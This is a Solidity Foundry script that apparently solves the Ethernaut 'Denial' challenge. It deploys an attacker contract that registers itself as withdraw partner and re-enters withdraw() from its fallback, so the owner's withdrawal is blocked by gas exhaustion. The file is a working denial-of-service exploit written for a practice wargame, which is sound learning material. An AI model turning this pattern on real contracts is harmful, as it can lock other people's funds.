// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import "./BaseScript.s.sol";
import {Script, console2} from "forge-std/Script.sol";

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Solution {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function attack() public {
        IDenial(contractAddress).setWithdrawPartner(address(this));
    }

    fallback() external payable {
        contractAddress.call(abi.encodeWithSignature("withdraw()"));
    }
}

contract DenialScript is BaseScript {
    Solution public solution;

    function setUp() public override {
        super.setUp();
    }

    function run() public {
        vm.startBroadcast();
        solution = new Solution(contractAddress);
        solution.attack();
        vm.stopBroadcast();
    }
}
